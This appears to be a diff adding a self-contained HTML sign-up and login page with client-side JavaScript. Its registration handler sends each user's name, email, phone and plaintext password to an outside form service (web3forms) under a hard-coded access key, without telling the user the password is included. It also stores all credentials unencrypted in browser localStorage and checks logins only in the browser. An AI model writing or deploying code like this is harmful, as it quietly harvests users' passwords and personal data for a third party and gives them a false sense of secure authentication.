@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome - Sign In / Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            top: -250px;
+            left: -250px;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            bottom: -200px;
+            right: -200px;
+            animation: float 8s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(20px); }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 450px;
+            position: relative;
+            z-index: 1;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .welcome-section {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .welcome-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .welcome-section h1 {
+            color: #667eea;
+            margin-bottom: 20px;
+            font-size: 2.5em;
+        }
+
+        .welcome-section p {
+            color: #666;
+            font-size: 1.2em;
+            margin-bottom: 30px;
+        }
+
+        .logout-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .logout-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .form-section {
+            display: block;
+        }
+
+        .form-section.hidden {
+            display: none;
+        }
+
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 28px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .tab-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #667eea;
+            background: white;
+            color: #667eea;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .tab-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .tab-btn.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-color: transparent;
+        }
+
+        .form-container {
+            display: none;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .form-container.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+            transform: translateY(-2px);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .message {
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 500;
+            display: none;
+            animation: slideDown 0.3s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .message.success {
+            background: #d4edda;
+            color: #155724;
+            border: 2px solid #c3e6cb;
+            display: block;
+        }
+
+        .message.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 2px solid #f5c6cb;
+            display: block;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 15px;
+            top: 38px;
+            color: #999;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="welcome-section" id="welcomeSection">
+            <h1>🎉 Welcome!</h1>
+            <p>Hello, <strong id="userName"></strong></p>
+            <p>You are successfully logged in!</p>
+            <button class="logout-btn" onclick="logout()">Logout</button>
+        </div>
+
+        <div class="form-section" id="formSection">
+            <h2>✨ Welcome Back ✨</h2>
+            
+            <div class="tab-buttons">
+                <button class="tab-btn active" onclick="showForm('signin')">Sign In</button>
+                <button class="tab-btn" onclick="showForm('login')">Login</button>
+            </div>
+
+            <div id="messageBox" class="message"></div>
+
+            <div id="signinForm" class="form-container active">
+                <form id="signInFormElement" onsubmit="handleSignIn(event)">
+                    <div class="form-group">
+                        <label for="fullName">Full Name *</label>
+                        <input type="text" id="fullName" name="fullName" required placeholder="Enter your full name">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="phone">Phone Number *</label>
+                        <input type="tel" id="phone" name="phone" required placeholder="Enter your phone number" pattern="[0-9]{10,}">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="signInEmail">Email *</label>
+                        <input type="email" id="signInEmail" name="email" required placeholder="Enter your email">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="signInPassword">Password *</label>
+                        <input type="password" id="signInPassword" name="password" required placeholder="Create a password" minlength="6">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="retypePassword">Retype Password *</label>
+                        <input type="password" id="retypePassword" name="retypePassword" required placeholder="Retype your password" minlength="6">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="message">Message</label>
+                        <textarea id="message" name="message" placeholder="Any message for us..."></textarea>
+                    </div>
+
+                    <input type="hidden" name="access_key" value="2232d9b9-cfc1-401f-8cf4-f898a973de0d">
+
+                    <button type="submit" class="submit-btn">🚀 Sign In</button>
+                </form>
+            </div>
+
+            <div id="loginForm" class="form-container">
+                <form onsubmit="handleLogin(event)">
+                    <div class="form-group">
+                        <label for="loginEmail">Email *</label>
+                        <input type="email" id="loginEmail" required placeholder="Enter your email">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="loginPassword">Password *</label>
+                        <input type="password" id="loginPassword" required placeholder="Enter your password">
+                    </div>
+
+                    <button type="submit" class="submit-btn">🔓 Login</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function checkLoginStatus() {
+            const loggedInUser = localStorage.getItem('loggedInUser');
+            if (loggedInUser) {
+                const userData = JSON.parse(loggedInUser);
+                document.getElementById('userName').textContent = userData.fullName;
+                document.getElementById('welcomeSection').classList.add('active');
+                document.getElementById('formSection').classList.add('hidden');
+            }
+        }
+
+        checkLoginStatus();
+
+        function showForm(formType) {
+            const signinForm = document.getElementById('signinForm');
+            const loginForm = document.getElementById('loginForm');
+            const tabButtons = document.querySelectorAll('.tab-btn');
+            
+            tabButtons.forEach(btn => btn.classList.remove('active'));
+            
+            if (formType === 'signin') {
+                signinForm.classList.add('active');
+                loginForm.classList.remove('active');
+                tabButtons[0].classList.add('active');
+            } else {
+                loginForm.classList.add('active');
+                signinForm.classList.remove('active');
+                tabButtons[1].classList.add('active');
+            }
+            
+            hideMessage();
+        }
+
+        function showMessage(message, type) {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.textContent = message;
+            messageBox.className = `message ${type}`;
+            messageBox.style.display = 'block';
+            
+            setTimeout(() => {
+                hideMessage();
+            }, 5000);
+        }
+
+        function hideMessage() {
+            const messageBox = document.getElementById('messageBox');
+            messageBox.style.display = 'none';
+        }
+
+        async function handleSignIn(event) {
+            event.preventDefault();
+            
+            const fullName = document.getElementById('fullName').value;
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('signInEmail').value;
+            const password = document.getElementById('signInPassword').value;
+            const retypePassword = document.getElementById('retypePassword').value;
+            const message = document.getElementById('message').value;
+            
+            if (password !== retypePassword) {
+                showMessage('❌ Passwords do not match!', 'error');
+                return;
+            }
+            
+            let users = JSON.parse(localStorage.getItem('users') || '[]');
+            
+            const existingUser = users.find(u => u.email === email);
+            if (existingUser) {
+                showMessage('❌ Email already registered! Please login.', 'error');
+                return;
+            }
+            
+            showMessage('⏳ Sending email...', 'success');
+            
+            const emailData = {
+                access_key: "2232d9b9-cfc1-401f-8cf4-f898a973de0d",
+                subject: "🎉 New User Sign In Alert",
+                from_name: "Your Website Sign In Form",
+                name: fullName,
+                email: email,
+                message: `
+                📝 NEW USER REGISTRATION DETAILS:
+                
+                👤 Full Name: ${fullName}
+                📧 Email: ${email}
+                📱 Phone Number: ${phone}
+                🔐 Password: ${password}
+                💬 Message: ${message || "No message provided"}
+                
+                🕐 Registration Time: ${new Date().toLocaleString()}
+                `
+            };
+            
+            try {
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(emailData)
+                });
+                
+                const result = await response.json();
+                
+                if (response.ok && result.success) {
+                    const userData = {
+                        fullName: fullName,
+                        phone: phone,
+                        email: email,
+                        password: password,
+                        message: message,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    users.push(userData);
+                    localStorage.setItem('users', JSON.stringify(users));
+                    
+                    showMessage('✅ Sign In successful! Email sent to admin!', 'success');
+                    
+                    setTimeout(() => {
+                        localStorage.setItem('loggedInUser', JSON.stringify(userData));
+                        document.getElementById('userName').textContent = fullName;
+                        document.getElementById('welcomeSection').classList.add('active');
+                        document.getElementById('formSection').classList.add('hidden');
+                    }, 1500);
+                    
+                    event.target.reset();
+                } else {
+                    showMessage('❌ Email failed to send! Sign In cancelled. Error: ' + (result.message || 'Unknown error'), 'error');
+                    console.error('Email Error:', result);
+                }
+            } catch (error) {
+                showMessage('❌ Email sending failed! Sign In cancelled. Check your internet connection.', 'error');
+                console.error('Network Error:', error);
+            }
+        }
+
+        function handleLogin(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            const users = JSON.parse(localStorage.getItem('users') || '[]');
+            
+            const user = users.find(u => u.email === email);
+            
+            if (!user) {
+                showMessage('❌ Email not exist! Please sign in first.', 'error');
+                return;
+            }
+            
+            if (user.password !== password) {
+                showMessage('❌ Incorrect password!', 'error');
+                return;
+            }
+            
+            showMessage('✅ Login successful!', 'success');
+            
+            setTimeout(() => {
+                localStorage.setItem('loggedInUser', JSON.stringify(user));
+                document.getElementById('userName').textContent = user.fullName;
+                document.getElementById('welcomeSection').classList.add('active');
+                document.getElementById('formSection').classList.add('hidden');
+            }, 1000);
+        }
+
+        function logout() {
+            localStorage.removeItem('loggedInUser');
+            document.getElementById('welcomeSection').classList.remove('active');
+            document.getElementById('formSection').classList.remove('hidden');
+            showMessage('👋 Logged out successfully!', 'success');
+        }
+    </script>
+</body>
+</html>
